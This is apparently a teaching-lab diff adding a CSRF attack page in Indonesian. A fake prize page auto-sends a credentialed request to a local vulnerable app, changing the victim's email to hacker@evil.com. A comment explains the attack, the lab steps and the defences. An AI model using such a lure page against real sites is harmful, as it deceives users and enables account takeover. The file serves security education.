@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Hadiah Gratis Untuk Anda!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 {
+            color: #667eea;
+            margin-bottom: 20px;
+        }
+        .gift {
+            font-size: 80px;
+            margin: 20px 0;
+        }
+        p {
+            color: #666;
+            font-size: 18px;
+            line-height: 1.6;
+        }
+        .loading {
+            margin-top: 30px;
+            color: #667eea;
+            font-weight: bold;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Selamat! Anda Mendapat Hadiah!</h1>
+        <div class="gift">🎁</div>
+        <p>Terima kasih telah menjadi pengguna setia kami!</p>
+        <p>Klaim hadiah Anda sekarang...</p>
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Sedang memproses hadiah Anda...</p>
+        </div>
+    </div>
+
+    <script>
+        // CSRF ATTACK menggunakan Fetch API
+        window.onload = function() {
+            console.log('🚨 CSRF ATTACK: Mengirim request untuk mengubah email korban...');
+            
+            // Kirim POST request dengan credentials
+            fetch('http://localhost:3000/change-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                credentials: 'include', // Penting: kirim cookie
+                body: JSON.stringify({
+                    email: 'hacker@evil.com'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Response:', data);
+                
+                // Show success message
+                document.querySelector('.loading').innerHTML = 
+                    '<p style="color: #28a745; font-size: 20px;">✅ Hadiah berhasil diproses!</p>' +
+                    '<p style="color: #666; font-size: 14px; margin-top: 10px;">Email Anda telah diperbarui untuk pengiriman hadiah.</p>';
+                
+                if(data.success) {
+                    console.log('✅ CSRF Attack berhasil! Email korban telah diubah menjadi hacker@evil.com');
+                } else {
+                    console.log('❌ CSRF Attack gagal:', data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.querySelector('.loading').innerHTML = 
+                    '<p style="color: #dc3545;">❌ Terjadi kesalahan</p>';
+            });
+        };
+    </script>
+
+    <!-- 
+    ═══════════════════════════════════════════════════════════════
+    PENJELASAN SERANGAN CSRF (Cross-Site Request Forgery):
+    ═══════════════════════════════════════════════════════════════
+    
+    Cara Kerja:
+    1. Korban harus sudah login ke aplikasi vulnerable (localhost:3000)
+    2. Attacker mengirim link palsu ini ke korban (lewat email, chat, dll)
+    3. Ketika korban membuka link ini, browser akan otomatis mengirim 
+       request POST ke http://localhost:3000/change-email
+    4. Karena korban sudah login, cookie akan otomatis dikirim bersama request
+    5. Server tidak memvalidasi asal request (tidak ada CSRF token)
+    6. Email korban berhasil diubah tanpa sepengetahuannya!
+    
+    Cara Test:
+    1. Buka aplikasi di http://localhost:5173
+    2. Login sebagai "korban" (password: 123456)
+    3. Buka file attacker-csrf.html ini di browser
+    4. Kembali ke aplikasi dan refresh - email sudah berubah!
+    
+    Cara Mencegah:
+    1. Gunakan CSRF Token (unique token per request)
+    2. Validasi referer/origin header
+    3. Gunakan SameSite cookie attribute
+    4. Untuk operasi sensitif, minta konfirmasi password
+    -->
+</body>
+</html>
